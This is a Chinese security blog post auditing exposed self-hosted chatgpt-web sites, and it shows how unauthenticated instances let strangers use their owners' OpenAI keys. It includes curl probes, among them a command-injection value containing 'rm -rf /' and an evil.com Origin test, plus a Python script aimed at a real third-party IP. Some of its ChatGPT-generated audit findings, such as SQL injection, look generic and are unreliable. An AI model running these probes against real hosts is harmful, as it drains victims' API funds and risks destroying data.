## 概述

CharGPT在国内外大火，国内有很多人利用开源项目的代码部署了私有ChatGPT的API网站，但这些网站真的安全吗？网站的安全性到底怎么样？

利用ChatGPT对最火爆的开源代码进行了审计，进行了一番研究。还真发现了一些问题。

私人搭建的网站风格如下：

![](https://image.3001.net/images/20230517/1684301309_646465fd2a8c509b9351c.png!small)

网站的开源地址如下：

<https://github.com/Chanzhaoyu/chatgpt-web>

通过引用分析发现，代码已经由20K的stars,代码更新次数已达42次，如下图：

![](https://image.3001.net/images/20230517/1684301329_64646611068adaec6d871.png!small)

## 测绘分析

在威胁情报平台通过搜索字符串"chatGPT-web"，发现有1.5万个匹配结果，8549条独立IP，也有同一个IP部署多个的情况。

![](https://image.3001.net/images/20230517/1684301357_6464662d159268fa8f17b.png!small)

其中有6578个网站部署在中国境内。

![](https://image.3001.net/images/20230517/1684301376_64646640ed5bb3e227ffd.png!small)

## 代码审计与安全发现

为了节省时间，直接使用ChatGPT对开源代码进行安全代码审计，发现了如下的安全问题和风险：

  * 认证和授权问题

在程序中使用了auth中间件来进行身份验证，但并没有详细说明使用的是哪种认证方式。此外，在路由路径中，没有对敏感操作进行授权，如/chat-process和/config。这可能导致未经授权的用户可以访问和操作这些敏感功能，从而导致数据泄露和系统的安全性受到威胁。

大部分系统连登录都没有配置，内置了openai的API key,任何人拿到IP地址和端口就可以直接使用ChatGPT。

  * 数据安全问题

在/chat-process路由中，接收到的请求体可以包含敏感信息，如prompt和options。然而，在处理这些数据时，并没有进行充分的输入验证和过滤，可能导致恶意数据注入、SQL注入等攻击，从而导致数据泄露和系统崩溃等安全问题。

  * 代码注入问题

在/chat-process路由中，存在将数据写入响应中的操作，而这些数据是从请求中获取的，这可能导致恶意用户将恶意代码注入到响应中，从而攻击其他用户或系统。

## 风险验证

利用CURL针对存在的问题进行验证如下：

1\. 验证认证和授权问题。

    
    
    curl -X POST -H "Content-Type: application/json" --data '{"username":"admin","password":"password"}' http://ip:3002/login

90%以上的站点不用登录就可以使用。

2\. 验证数据安全问题。

    
    
    curl -X POST -H "Content-Type: application/json" --data '{"prompt":"test","options":{"key":"value"},"systemMessage":"test","temperature":0.5,"top_p":0.5}' http://ip:3002/chat-process

执行命令后的结果如下：

![](https://image.3001.net/images/20230517/1684301515_646466cb84c063913c3f7.png!small)

得出结论为恶意用户可以在不知带openai-api-key的情况下，利用网站的API, 获得ChatGPT输出数据内容。

3\. 验证代码注入问题

    
    
    curl -X POST -H "Content-Type: application/json" --data '{"token":"test; rm -rf /"}' http://ip:3002/verify

4\. 验证敏感信息是否加密传输

    
    
    curl -k http://ip:3002/session

如果返回的响应中包含AUTH_SECRET_KEY，则表示敏感信息未加密传输。

5\. 验证Access-Control-Allow-Origin是否设置为通配符

    
    
    curl -i http://ip:3002/chat-process -H "Origin: https://evil.com"

如果响应头中包含Access-Control-Allow-Origin: *，则表示存在跨站点脚本攻击（XSS）风险。

## 编写代码复现

利用python编写验证代码如下：

    
    
    #!/usr/bin/env python  
    #_*_ coding:utf-8 _*_  
    
    import requests
    import json
    import time
    
    def chat_api(prompt):
        url = "http://141.147.168.252:3002/chat-process"
        headers = {"Content-Type": "application/json"}
        payload = {
            "prompt": prompt,
            "systemMessage": "test",
            "temperature": 0.5,
            "top_p": 0.5
        }
        response = requests.post(url, headers=headers, data=json.dumps(payload),stream=True)
        if response.status_code != 200:
            print("error")
            return None
        #print(response.status_code)
        #print(response.text)
        text_value = []
        for chunk in response.iter_lines():
            #print(str(chunk))
            data = json.loads(chunk)
            text_value = data["text"]
            if text_value != None:
                print(text_value)
        return text_value
    
    chat_api("中国的首都在哪里?")

运行结果如下：

    
    
    中国
    中国的
    中国的首
    中国的首都
    中国的首都是
    中国的首都是北
    中国的首都是北京。
    中国的首都是北京。
    中国的首都是北京。
    

可以得出结论，在不知道用户的openai-API-KEY的情况下，攻击者可以对用户站点的API进行调用。用户账户里的资金可以在用户不知情的情况下被消耗。站点的其它更多问题，暂时没有去验证，但因为站点都使用了http协议，安全风险非常大。

## 其他安全风险

  * 数据隐私泄露风险

ChatGPT是通过大量语料库进行训练的，其中包含了很多用户的个人信息。如果这些语料库被用于非法目的或者不当使用，就可能导致用户信息泄露的风险，攻击者也可以通过获得相关的日志内容并进行分析，发现更多有价值的数据。

  * 恶意攻击风险

ChatGPT模型可以被用于生成虚假信息、网络钓鱼等恶意行为，当攻击者入侵了ChatGPT系统并训练生成虚假数据，就会导致因虚假内容的生产和传播损坏服务提供方和服务使用方的利益。

  * HTTP协议风险

例如：<http://112.93.121.160:3002/#/chat/1002>

网站使用了古老的http协议，此协议存在以下安全风险：

  1. 窃听攻击：HTTP协议在传输数据时采用明文形式，容易被攻击者窃听。攻击者可以通过中间人攻击等手段截取网络流量，获取用户的敏感信息。
  2. 中间人攻击：由于HTTP协议没有身份验证机制，攻击者可以伪装成服务器或客户端，与用户通信并获取用户的信息。
  3. XSS攻击：当Web应用程序以未经过滤的方式向浏览器输出用户输入的数据时，攻击者可以插入恶意脚本，导致用户的浏览器执行这些脚本，从而实现攻击目的。这种攻击称为跨站脚本攻击（XSS攻击）。
  4. CSRF攻击：攻击者利用受害者的身份，在不知情的情况下，通过构造特殊的URL或表单提交，向Web应用程序发送恶意请求，从而实现攻击目的。这种攻击称为跨站请求伪造（CSRF攻击）。

建议使用HTTPS协议、加密用户数据、限制数据的访问范围、对Web应用程序进行安全审查、对用户输入的数据进行校验等。同时，开发人员应该加强对Web应用程序的安全性设计和编码，以及不断更新升级以修复已知安全漏洞。

## 总结

ChatGPT的使用需求越来越多，在构建应用和服务时，需要加入网络安全因素考量，采取包括但不限于加密用户数据、限制数据的访问范围、对模型进行安全审查等安全措施，同时需要加强对类似技术的监管，保证服务提供和使用的安全可控。

